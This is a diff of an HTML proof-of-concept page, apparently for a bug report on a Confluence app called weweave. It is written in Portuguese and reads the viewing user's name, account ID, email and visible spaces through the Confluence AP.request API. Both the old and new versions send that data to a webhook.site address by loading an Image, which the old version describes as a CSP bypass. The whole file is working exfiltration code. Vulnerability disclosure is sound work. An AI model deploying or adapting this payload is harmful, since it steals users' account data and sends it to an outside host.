@@ -1,32 +1,49 @@
 <!DOCTYPE html>
 <html>
 <body>
+  <h3>PoC - Information Disclosure via weweave dialogs</h3>
+  <div id="result">Carregando...</div>
+  
   <script>
-    // Passo 1: Acessar API do Confluence como o usuário que visualiza a página
-    AP.request('/rest/api/user/current', {
-      success: function(userData) {
-        var user = JSON.parse(userData);
-        
-        // Passo 2: Listar espaços que o usuário tem acesso
-        AP.request('/rest/api/space?limit=5', {
-          success: function(spacesData) {
-            
-            // Passo 3: Exfiltrar tudo via Image (bypass CSP)
-            var payload = {
-              timestamp: new Date().toISOString(),
-              user: user.displayName,
-              accountId: user.accountId,
-              spaces: spacesData,
-              userAgent: navigator.userAgent,
-              referrer: document.referrer
-            };
-            
-            new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?stolen=' + 
-              encodeURIComponent(JSON.stringify(payload));
-          }
-        });
-      }
-    });
+    // Verificar se AP está disponível
+    if (typeof AP === 'undefined') {
+      document.getElementById('result').innerHTML = 'AP não disponível neste contexto';
+    } else {
+      // Exfiltrar dados do usuário
+      AP.request('/rest/api/user/current', {
+        success: function(response) {
+          var user = JSON.parse(response);
+          
+          // Mostrar na página (para screenshot)
+          document.getElementById('result').innerHTML = 
+            '<b>Usuário:</b> ' + user.displayName + '<br>' +
+            '<b>Account ID:</b> ' + user.accountId + '<br>' +
+            '<b>Email:</b> ' + (user.email || 'Não disponível') + '<br>' +
+            '<b>Status:</b> ' + user.accountStatus;
+          
+          // Exfiltrar para webhook (prova de conceito)
+          var img = new Image();
+          img.src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?poc=user&data=' + 
+            encodeURIComponent(JSON.stringify({
+              name: user.displayName,
+              id: user.accountId,
+              time: new Date().toISOString()
+            }));
+        },
+        error: function(xhr, status) {
+          document.getElementById('result').innerHTML = 'Erro: ' + status;
+        }
+      });
+      
+      // Tentar listar espaços (outro endpoint de leitura)
+      AP.request('/rest/api/space?limit=5', {
+        success: function(spaces) {
+          var img = new Image();
+          img.src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?poc=spaces&data=' + 
+            encodeURIComponent(spaces.substring(0, 200));
+        }
+      });
+    }
   </script>
 </body>
 </html>
